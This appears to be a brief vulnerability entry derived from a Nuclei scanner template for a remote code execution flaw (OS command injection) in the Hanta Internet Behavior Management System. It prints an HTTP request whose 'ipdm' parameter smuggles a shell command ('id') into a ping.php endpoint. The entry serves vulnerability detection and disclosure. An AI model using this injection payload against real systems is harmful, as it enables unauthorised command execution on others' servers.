# Vulnerability: Hanta Internet Behavior Management System - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`hanta-rce.yaml`)

## Description
Hanta Internet Behavior Management System is vulnerable to RCE.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=2;id;
```

